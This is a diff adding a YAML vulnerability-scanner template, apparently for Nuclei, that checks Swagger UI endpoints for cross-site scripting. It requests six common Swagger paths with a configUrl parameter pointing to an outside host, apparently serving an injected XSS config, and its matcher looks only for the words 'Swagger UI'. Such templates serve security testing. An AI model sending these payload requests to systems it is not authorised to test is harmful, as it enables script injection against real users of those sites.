@@ -1,0 +1,24 @@
+id: xss-injection-swagger
+
+info:
+  name: XSS Injection in Swagger URLs
+  author: [erickfernandox]
+  severity: high
+  description: |
+    Este template verifica se as URLs de Swagger retornam uma imagem com código XSS injetado.
+  tags: xss,injection,swagger
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/swagger/index.html?configUrl=https://xss.smarpo.com/test.json"
+      - "{{BaseURL}}/swagger-ui/index.html?configUrl=https://xss.smarpo.com/test.json"
+      - "{{BaseURL}}/swagger-ui.html?configUrl=https://xss.smarpo.com/test.json"
+      - "{{BaseURL}}/api/docs?configUrl=https://xss.smarpo.com/test.json"
+      - "{{BaseURL}}/api-doc?configUrl=https://xss.smarpo.com/test.json"
+      - "{{BaseURL}}/api/swagger-ui.html?configUrl=https://xss.smarpo.com/test.json"
+      
+    matchers:
+      - type: word
+        words:
+          - "Swagger UI"
